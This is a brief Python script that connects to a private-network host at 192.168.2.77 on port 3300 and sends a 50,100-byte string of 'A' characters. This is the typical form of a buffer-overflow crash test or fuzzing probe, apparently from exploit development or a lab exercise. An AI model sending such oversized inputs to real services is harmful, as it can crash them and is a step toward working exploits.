#!/usr/bin/python
 
def main():
   try:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.connect(('192.168.2.77', 3300))
       buffer = "A" * 50100
       s.send(buffer)
       s.close()
   except Exception:
       raise

if __name__ == '__main__':
   import socket
   main()

